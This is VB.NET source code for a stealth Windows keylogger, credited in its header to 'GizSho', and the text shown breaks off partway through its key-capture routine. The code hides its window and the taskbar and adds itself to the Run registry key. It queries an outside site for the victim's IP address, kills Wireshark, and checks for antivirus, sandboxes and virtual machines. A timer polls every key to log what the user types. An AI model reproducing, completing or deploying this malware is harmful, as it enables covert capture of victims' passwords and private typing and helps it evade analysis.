Imports System.IO
Imports System
Imports System.Drawing
Imports System.Windows.Forms
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Text
Imports Microsoft.Win32

Public Class Form1
    '\-------------------------------------------------\
    ' \ ~Keylogger coded by GizSho~                     \
    '  \  ~He pwns you~                                  \
    '   \-------------------------------------------------\

    '\---------------------------------------------\
    ' \  Thanks to Sgt. Punishment for helping me   \
    '  \   out with my builder!  ~ YOU ROCK!         \
    '   \---------------------------------------------\

    Dim options(), text1, text2, text3 As String
    Const Filesplit = "@Muncher@"
    Dim result As Integer ' May cause problems, not sure... I've got this in my logger, so not 100%
    Dim keystate As Integer
    Dim Shift As Integer
    Dim MachineName As String = Environment.MachineName
    Dim TaskBarHwnd As Long
    Dim Anubis As Process() = Process.GetProcesses
    Dim a As Integer
    Dim perky As Process() = Process.GetProcesses
    Dim p As Integer
    Dim Proc As System.Diagnostics.Process
    Dim title As String
    Dim ProcessList As System.Diagnostics.Process()
    Dim folder As String = Application.StartupPath
    Dim getFile As String = folder & "\sample.exe"
    Dim DesktopPath As String
    Dim webclient As New System.Net.WebClient
    Dim stats As String
    Dim Devices As Object, Grafikadapter As String, RegionA As String = "SELECT * FROM Win32_VideoController"
    Dim regPID As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion", False)
    Dim pid As Object = regPID.GetValue("ProductId")
    Dim id As String = "76487-337-8429955-22614"
    Dim key As Microsoft.Win32.RegistryKey = My.Computer.Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run")
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
    Private Declare Function RegisterServiceProcess Lib "Kernel32.dll" (ByVal dwProcessId As Integer, ByVal dwType As Integer) As Integer
    Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
    Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
    Const SWP_HIDEWINDOW = &H80
    Const SWP_SHOWWINDOW = &H40

    Public Function CAPSLOCKON() As Boolean

    End Function

    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing

    End Sub
    Public Function antiKAV() As Boolean
        On Error GoTo error1
        If Process.GetProcessesByName("avp").Length >= 1 Then
            Return True
        Else
            Return False
        End If
        Exit Function
error1:
        End
    End Function
    Private Sub AntiWireShark()
        ProcessList = System.Diagnostics.Process.GetProcesses()
        For Each Me.Proc In ProcessList
            title = Proc.MainWindowTitle
            If (String.Equals(title, "The Wireshark Network Analyzer")) Then

                Proc.Kill()

            End If
        Next
    End Sub
    Public Function antiSandboxie() As Boolean
        On Error GoTo error1
        If Process.GetProcessesByName("SbieSvc").Length >= 1 Then
            Return True
        Else
            Return False
        End If
        Exit Function
error1:
        End
    End Function

    Public Function antiAnubis() As Boolean
        On Error GoTo error1
        
If Application.ExecutablePath = getFile Then
            Return True
        Else
            Return False
        End If
        Exit Function
error1:
        End
    End Function

    Public Function antiAnubis2() As Boolean
        On Error GoTo error1
        If pid = id Then
            Return True
        Else
            Return False
        End If
        Exit Function
error1:
        End
    End Function

    Public Function AntiVirtualBox() As Boolean
        On Error GoTo error1
        Call getDevices()

        Select Case Grafikadapter
            Case "VirtualBox Graphics Adapter"
                Return True
            Case Else
                Return False
        End Select
        Exit Function
error1:
        End
    End Function

    Public Function AntiVmWare() As Boolean
        On Error GoTo error1
        Call getDevices()

        Select Case Grafikadapter
            Case "VMware SVGA II"
                Return True
            Case Else
                Return False
        End Select
        Exit Function
error1:
        End
    End Function

    Public Function AntiVirtualPC() As Boolean
        On Error GoTo error1
        Call getDevices()

        Select Case Grafikadapter
            Case "VM Additions S3 Trio32/64"
                Return True
            Case Else
                Return False
        End Select
        Exit Function
error1:
        End
    End Function

    Private Sub getDevices()
        On Error GoTo error1
        Devices = GetObject("winmgmts:").ExecQuery(RegionA)
        For Each AdaptList In Devices
            Grafikadapter = AdaptList.Description
        Next
        Exit Sub
error1:
        End
    End Sub

    Private Sub Form1_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles Me.KeyUp

    End Sub
    Public Function GetEncryptedData(ByVal Data As String) As String
        Dim shaM As New SHA1Managed
        Convert.ToBase64String(shaM.ComputeHash(Encoding.ASCII.GetBytes(Data)))
        Dim eNC_data() As Byte = ASCIIEncoding.ASCII.GetBytes(Data)
        Dim eNC_str As String = Convert.ToBase64String(eNC_data)
        GetEncryptedData = eNC_str
    End Function
    Public Function GetDecryptedData(ByVal Data As String) As String
        Dim dEC_data() As Byte = Convert.FromBase64String(Data)
        Dim dEC_Str As String = ASCIIEncoding.ASCII.GetString(dEC_data)
        GetDecryptedData = dEC_Str
    End Function
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        'ah fair enough
        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
        text1 = Space(LOF(1))
        text2 = Space(LOF(1))
        text3 = Space(LOF(1))
        FileGet(1, text1) 'First Option
        FileGet(1, text2)   'You guessed it, second option
        FileGet(1, text3)
        FileClose(1)
        options = Split(text1, Filesplit)
        TextBox4.Text = options(1)
        TextBox5.Text = options(2)
        TextBox6.Text = options(3)
        'hide the program        
        Me.Opacity = 0
        Me.ShowInTaskbar = False
        Me.Hide()
        Me.WindowState = FormWindowState.Minimized

        'call the function to hide the app in the taskbar
        Call SetWindowPos(TaskBarHwnd, 0&, 0&, 0&, 0&, 0&, SWP_HIDEWINDOW)
        TaskBarHwnd = FindWindow("Shell_traywnd", "")

        'enables timers and sets the intervals
        Timer1.Enabled = True
        Timer1.Interval = 1
        Timer2.Enabled = True
        Timer2.Interval = 600000

        'adds the program to startup
        key.SetValue(My.Application.Info.ProductName, """" & System.Reflection.Assembly.GetEntryAssembly.Location & """")

        'gets the name of your machine
        TextBox2.Text = MachineName

        'gets the IP address of the user
        stats = System.Text.Encoding.ASCII.GetString(( _
        webclient.DownloadData("http://whatismyip.com/automation/n09230945.asp")))
        TextBox3.Text = stats

        'kills processes
        antiAnubis()
        antiAnubis2()
        antiKAV()
        antiSandboxie()
        AntiVirtualBox()
        AntiVirtualPC()
        AntiWireShark()
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        'Full Keylogger Code
        'Detects advanced keys such as [], shift, and all that good stuff

        Shift = GetAsyncKeyState(System.Windows.Forms.Keys.ShiftKey)

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.A)
        If (CAPSLOCKON() = True And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = False And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "A"
        End If
        If (CAPSLOCKON() = False And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = True And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "a"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.B)
        If (CAPSLOCKON() = True And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = False And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "B"
        End If
        If (CAPSLOCKON() = False And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = True And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "b"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.C)
        If (CAPSLOCKON() = True And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = False And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "C"
        End If
        If (CAPSLOCKON() = False And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = True And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "c"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.D)
        If (CAPSLOCKON() = True And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = False And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "D"
        End If
        If (CAPSLOCKON() = False And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = True And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "d"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.E)
        If (CAPSLOCKON() = True And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = False And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "E"
        End If
        If (CAPSLOCKON() = False And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = True And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "e"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.F)
        If (CAPSLOCKON() = True And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = False And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "F"
        End If
        If (CAPSLOCKON() = False And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = True And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "f"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.G)
        If (CAPSLOCKON() = True And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = False And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "G"
        End If
        If (CAPSLOCKON() = False And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = True And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "g"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.H)
        If (CAPSLOCKON() = True And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = False And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "H"
        End If
        If (CAPSLOCKON() = False And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = True And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "h"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.I)
        If (CAPSLOCKON() = True And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = False And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "I"
        End If
        If (CAPSLOCKON() = False And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = True And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "i"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.J)
        If (CAPSLOCKON() = True And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = False And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "J"
        End If
        If (CAPSLOCKON() = False And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = True And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "j"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.K)
        If (CAPSLOCKON() = True And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = False And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "K"
        End If
        If (CAPSLOCKON() = False And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = True And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "k"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.L)
        If (CAPSLOCKON() = True And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = False And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "L"
        End If
        If (CAPSLOCKON() = False And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = True And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "l"
        End If


        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.M)
        If (CAPSLOCKON() = True And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = False And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "M"
        End If
        If (CAPSLOCKON() = False And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = True And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "m"
        End If


        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.N)
        If (CAPSLOCKON() = True And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = False And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "N"
        End If
        If (CAPSLOCKON() = False And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = True And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "n"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.O)
        If (CAPSLOCKON() = True And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = False And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "O"
        End If
        If (CAPSLOCKON() = False And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = True And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "o"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.P)
        If (CAPSLOCKON() = True And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = False And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "P"
        End If
        If (CAPSLOCKON() = False And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = True And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "p"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.Q)
        If (CAPSLOCKON() = True And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = False And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "Q"
        End If
        If (CAPSLOCKON() = False And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = True And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "q"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.R)
        If (CAPSLOCKON() = True And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = False And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "R"
        End If
        If (CAPSLOCKON() = False And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = True And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "r"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.S)
        If (CAPSLOCKON() = True And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = False And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "S"
        End If
        If (CAPSLOCKON() = False And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = True And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "s"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.T)
        If (CAPSLOCKON() = True And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = False And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "T"
        End If
        If (CAPSLOCKON() = False And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = True And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "t"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.U)
        If (CAPSLOCKON() = True And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = False And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "U"
        End If
        If (CAPSLOCKON() = False And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = True And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "u"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.V)
        If (CAPSLOCKON() = True And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = False And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "V"
        End If
        If (CAPSLOCKON() = False And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = True And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "v"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.W)
        If (CAPSLOCKON() = True And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = False And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "W"
        End If
        If (CAPSLOCKON() = False And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = True And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "w"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.X)
        If (CAPSLOCKON() = True And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = False And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "X"
        End If
        If (CAPSLOCKON() = False And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = True And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "x"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.Y)
        If (CAPSLOCKON() = True And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = False And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "Y"
        End If
        If (CAPSLOCKON() = False And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = True And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "y"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.Z)
        If (CAPSLOCKON() = True And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = False And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "Z"
        End If
        If (CAPSLOCKON() = False And Shift = 0 And (keystate And &H1S) = &H1S) Or (CAPSLOCKON() = True And Shift <> 0 And (keystate And &H1S) = &H1S) Then
            TextBox1.Text = TextBox1.Text & "z"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.D1)
        If Shift = 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "1"
        End If

        If Shift <> 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "!"
        End If


        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.D2)
        If Shift = 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "2"
        End If

        If Shift <> 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "@"
        End If


        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.D3)
        If Shift = 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "3"
        End If

        If Shift <> 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "#"
        End If


        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.D4)
        If Shift = 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "4"
        End If

        If Shift <> 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "$"
        End If


        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.D5)
        If Shift = 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "5"
        End If

        If Shift <> 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "%"
        End If


        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.D6)
        If Shift = 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "6"
        End If

        If Shift <> 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "^"
        End If


        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.D7)
        If Shift = 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "7"
        End If

        If Shift <> 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "&"
        End If


        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.D8)
        If Shift = 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "8"
        End If

        If Shift <> 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "*"
        End If


        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.D9)
        If Shift = 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "9"
        End If

        If Shift <> 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "("
        End If


        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.D0)
        If Shift = 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "0"
        End If

        If Shift <> 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & ")"
        End If


        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.Back)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{backspace}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.Tab)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{tab}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.Return)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & vbCrLf
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.ShiftKey)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{shift}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.ControlKey)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{ctrl}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.Menu)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{alt}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.Pause)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{pause}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.Escape)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{esc}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.Space)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & " "
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.End)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{end}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.Home)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{home}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.Left)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{left}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.Right)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{right}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.Up)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{up}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.Down)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{down}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.Insert)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{insert}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.Delete)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{Delete}"
        End If

        keystate = GetAsyncKeyState(&HBAS)
        If Shift = 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & ";"
        End If

        If Shift <> 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & ":"
        End If

        keystate = GetAsyncKeyState(&HBBS)
        If Shift = 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "="
        End If

        If Shift <> 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "+"
        End If

        keystate = GetAsyncKeyState(&HBCS)
        If Shift = 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & ","
        End If

        If Shift <> 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "<"
        End If

        keystate = GetAsyncKeyState(&HBDS)
        If Shift = 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "-"
        End If

        If Shift <> 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "_"
        End If

        keystate = GetAsyncKeyState(&HBES)
        If Shift = 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "."
        End If

        If Shift <> 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & ">"
        End If

        keystate = GetAsyncKeyState(&HBFS)
        If Shift = 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "/"
        End If

        If Shift <> 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "?"
        End If

        keystate = GetAsyncKeyState(&HC0S)
        If Shift = 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "`"
        End If

        If Shift <> 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "~"
        End If

        keystate = GetAsyncKeyState(&HDBS)
        If Shift = 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "["
        End If

        If Shift <> 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{"
        End If

        keystate = GetAsyncKeyState(&HDCS)
        If Shift = 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "\"
        End If

        If Shift <> 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "|"
        End If

        keystate = GetAsyncKeyState(&HDDS)
        If Shift = 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "]"
        End If

        If Shift <> 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "}"
        End If

        keystate = GetAsyncKeyState(&HDES)
        If Shift = 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "'"
        End If

        If Shift <> 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & Chr(34)
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.Multiply)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "*"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.Divide)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "/"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.Add)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "+"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.Subtract)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "-"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.Decimal)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{Del}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.F1)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{F1}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.F2)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{F2}"
        End If

